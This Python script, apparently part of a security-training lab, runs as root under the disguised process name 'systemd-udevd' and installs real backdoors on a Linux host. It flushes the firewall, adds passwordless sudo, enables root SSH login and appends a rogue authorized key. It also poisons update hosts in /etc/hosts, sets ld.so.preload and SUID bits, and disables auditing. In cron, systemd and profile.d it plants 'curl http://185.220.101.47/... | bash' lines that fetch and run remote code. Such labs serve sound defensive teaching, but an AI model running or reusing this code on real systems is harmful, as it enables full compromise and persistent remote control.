from __future__ import annotations

"""
System misconfiguration simulator — requires root (sudo python -m spawner start --level misconfig).
Runs once, applies all misconfigs, writes a manifest, exits.
"""

import json
import os
import pathlib
import subprocess
import time
import sys
sys.path.insert(0, str(pathlib.Path(__file__).parents[2]))
from spawner.utils import set_proc_name

PROC = "systemd-udevd"
MANIFEST = pathlib.Path("/tmp/.misconfig_manifest.json")
REPORT = pathlib.Path("/var/log/misconfig_applied.log")

changes: list[dict] = []


def record(name: str, detail: str, reversible: str) -> None:
    ts = time.strftime("%Y-%m-%dT%H:%M:%S")
    entry = {"time": ts, "change": name, "detail": detail, "reverse": reversible}
    changes.append(entry)
    try:
        with REPORT.open("a") as f:
            f.write(f"[{ts}] {name}: {detail}\n")
    except Exception:
        pass
    print(f"[MISCONFIG] {name}: {detail}")


def run(cmd: list[str]) -> tuple[int, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return r.returncode, r.stdout + r.stderr
    except Exception as e:
        return 1, str(e)


def firewall() -> None:
    rc, out = run(["iptables", "-F"])
    if rc == 0:
        run(["iptables", "-P", "INPUT", "ACCEPT"])
        run(["iptables", "-P", "FORWARD", "ACCEPT"])
        run(["iptables", "-P", "OUTPUT", "ACCEPT"])
        record("FIREWALL_FLUSH", "iptables flushed, policy=ACCEPT on all chains",
               "iptables-restore or ufw enable")

    rc2, _ = run(["ufw", "disable"])
    if rc2 == 0:
        record("UFW_DISABLED", "ufw firewall disabled",
               "ufw enable")


def sudoers_backdoor() -> None:
    path = pathlib.Path("/etc/sudoers.d/99-backdoor")
    try:
        path.write_text("www-data ALL=(ALL) NOPASSWD:ALL\njohn ALL=(ALL) NOPASSWD:ALL\n")
        path.chmod(0o440)
        record("SUDOERS_BACKDOOR", f"NOPASSWD:ALL added for www-data and john at {path}",
               f"rm {path}")
    except Exception as e:
        record("SUDOERS_BACKDOOR", f"FAILED: {e}", "N/A")


def sshd_config() -> None:
    cfg = pathlib.Path("/etc/ssh/sshd_config")
    bak = pathlib.Path("/etc/ssh/sshd_config.bak")
    try:
        original = cfg.read_text()
        bak.write_text(original)

        patched = original
        replacements = {
            "PermitRootLogin no": "PermitRootLogin yes",
            "PermitRootLogin prohibit-password": "PermitRootLogin yes",
            "#PermitRootLogin": "PermitRootLogin yes\n#PermitRootLogin",
            "PasswordAuthentication no": "PasswordAuthentication yes",
            "#PasswordAuthentication yes": "PasswordAuthentication yes",
            "#PermitEmptyPasswords no": "PermitEmptyPasswords yes",
        }
        for old, new in replacements.items():
            patched = patched.replace(old, new)

        extras = (
            "\n# Added by update-manager\n"
            "AllowTcpForwarding yes\n"
            "GatewayPorts yes\n"
            "X11Forwarding yes\n"
            "PermitTunnel yes\n"
        )
        cfg.write_text(patched + extras)
        record("SSHD_CONFIG", "PermitRootLogin=yes, PasswordAuth=yes, GatewayPorts=yes",
               f"cp {bak} {cfg}")
    except Exception as e:
        record("SSHD_CONFIG", f"FAILED: {e}", "N/A")


def authorized_keys_backdoor() -> None:
    fake_key = (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5JDY8e/HLDpTqVeDR6e3k"
        "Xm9P2WvB8xKdZqFn1oIGCz3hMzK6gKqNtH8VVr4qjwHFDuQWkG9Pb4xK7DM"
        "JlLuReHVWXFNpZzqBfYjnC2mHKZV1FHpzlVH3mHmGDZQDzXRvF1KqLnBvP5j"
        "Yx8TzX9HmVxD2KqBnH4T8e7Xp2GhN6FvLtBpKzQmZcW8DqJnVrKHfL9X4E1m"
        "AttackerKey2024 attacker@evil.com"
    )
    for target_dir in [pathlib.Path("/root/.ssh"), pathlib.Path("/home/virellus/.ssh")]:
        try:
            target_dir.mkdir(mode=0o700, exist_ok=True)
            keys_file = target_dir / "authorized_keys"
            with keys_file.open("a") as f:
                f.write(f"\n{fake_key}\n")
            keys_file.chmod(0o600)
            record("AUTHORIZED_KEYS", f"Rogue SSH public key added to {keys_file}",
                   f"Edit {keys_file} and remove attacker@evil.com line")
        except Exception as e:
            record("AUTHORIZED_KEYS", f"FAILED for {target_dir}: {e}", "N/A")


def hosts_poisoning() -> None:
    entries = (
        "\n# Added by system-update\n"
        "185.220.101.47   windowsupdate.microsoft.com\n"
        "185.220.101.47   download.docker.com\n"
        "185.220.101.47   packages.microsoft.com\n"
        "104.21.0.1       security.debian.org\n"
        "104.21.0.1       deb.debian.org\n"
    )
    try:
        with pathlib.Path("/etc/hosts").open("a") as f:
            f.write(entries)
        record("HOSTS_POISONED", "Redirected windowsupdate, docker, debian repos to attacker IPs",
               "Edit /etc/hosts and remove poisoned entries")
    except Exception as e:
        record("HOSTS_POISONED", f"FAILED: {e}", "N/A")


def ld_preload_hook() -> None:
    try:
        pathlib.Path("/etc/ld.so.preload").write_text("/tmp/.libaudit_hook.so\n")
        record("LD_PRELOAD", "/etc/ld.so.preload set to /tmp/.libaudit_hook.so",
               "rm /etc/ld.so.preload")
    except Exception as e:
        record("LD_PRELOAD", f"FAILED: {e}", "N/A")


def suid_binaries() -> None:
    targets = ["/usr/bin/python3", "/usr/bin/find", "/usr/bin/vim.basic", "/usr/bin/python3.11"]
    for target in targets:
        if pathlib.Path(target).exists():
            rc, _ = run(["chmod", "u+s", target])
            if rc == 0:
                record("SUID_SET", f"SUID bit set on {target}",
                       f"chmod u-s {target}")


def disable_auditd() -> None:
    run(["systemctl", "stop", "auditd"])
    run(["systemctl", "disable", "auditd"])
    suppress_rules = pathlib.Path("/etc/audit/rules.d/99-disable.rules")
    try:
        suppress_rules.parent.mkdir(parents=True, exist_ok=True)
        suppress_rules.write_text("-a never,exit -F arch=b64 -S all\n-a never,exit -F arch=b32 -S all\n")
        record("AUDITD_DISABLED", "auditd stopped, suppression rules written",
               "systemctl start auditd && rm /etc/audit/rules.d/99-disable.rules")
    except Exception as e:
        record("AUDITD_DISABLED", f"FAILED: {e}", "N/A")


def cron_persistence() -> None:
    # Cron job
    cron_entry = "*/5 * * * * root curl -s http://185.220.101.47/update.sh | bash\n"
    try:
        pathlib.Path("/etc/cron.d/system-update").write_text(
            f"# System update check\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n{cron_entry}"
        )
        record("CRON_PERSISTENCE", "/etc/cron.d/system-update added with C2 beacon job",
               "rm /etc/cron.d/system-update")
    except Exception as e:
        record("CRON_PERSISTENCE", f"FAILED: {e}", "N/A")

    # Root crontab
    try:
        with pathlib.Path("/var/spool/cron/crontabs/root").open("a") as f:
            f.write("@reboot /tmp/.persist.sh\n")
        record("ROOT_CRONTAB", "@reboot /tmp/.persist.sh added to root crontab",
               "crontab -e as root and remove @reboot line")
    except Exception as e:
        record("ROOT_CRONTAB", f"FAILED: {e}", "N/A")


def systemd_service() -> None:
    unit = """\
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl -s http://185.220.101.47/c2 | bash; sleep 300; done'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
    try:
        pathlib.Path("/etc/systemd/system/system-update.service").write_text(unit)
        run(["systemctl", "daemon-reload"])
        # Intentionally NOT enabling it — students must check with systemctl is-enabled
        record("SYSTEMD_SERVICE", "system-update.service written (NOT enabled — check is-enabled)",
               "systemctl disable system-update && rm /etc/systemd/system/system-update.service")
    except Exception as e:
        record("SYSTEMD_SERVICE", f"FAILED: {e}", "N/A")


def profile_backdoor() -> None:
    try:
        pathlib.Path("/etc/profile.d/update.sh").write_text(
            "# System telemetry\ncurl -s http://185.220.101.47/shell.sh | bash\n"
        )
        record("PROFILE_BACKDOOR", "/etc/profile.d/update.sh will exec on every login shell",
               "rm /etc/profile.d/update.sh")
    except Exception as e:
        record("PROFILE_BACKDOOR", f"FAILED: {e}", "N/A")


def world_writable_dirs() -> None:
    for path in ["/etc/cron.d", "/etc/sudoers.d"]:
        rc, _ = run(["chmod", "777", path])
        if rc == 0:
            record("WORLD_WRITABLE", f"{path} set to 777",
                   f"chmod 755 {path}")


def main() -> None:
    set_proc_name(PROC)
    print("[*] Misconfig simulator starting — applying system misconfigurations")

    if os.geteuid() != 0:
        print("[!] Not running as root — most misconfigs will fail. Run with sudo.")

    firewall()
    sudoers_backdoor()
    sshd_config()
    authorized_keys_backdoor()
    hosts_poisoning()
    ld_preload_hook()
    suid_binaries()
    disable_auditd()
    cron_persistence()
    systemd_service()
    profile_backdoor()
    world_writable_dirs()

    # Write manifest
    try:
        MANIFEST.write_text(json.dumps(changes, indent=2))
        print(f"\n[*] Manifest written to {MANIFEST}")
        print(f"[*] Report written to {REPORT}")
    except Exception:
        pass

    applied = [c for c in changes if "FAILED" not in c["detail"]]
    failed = [c for c in changes if "FAILED" in c["detail"]]
    print(f"\n[+] Applied: {len(applied)}  Failed: {len(failed)}")
    print("[*] Run 'sudo ./kill.sh' to undo all misconfigurations.")


main()
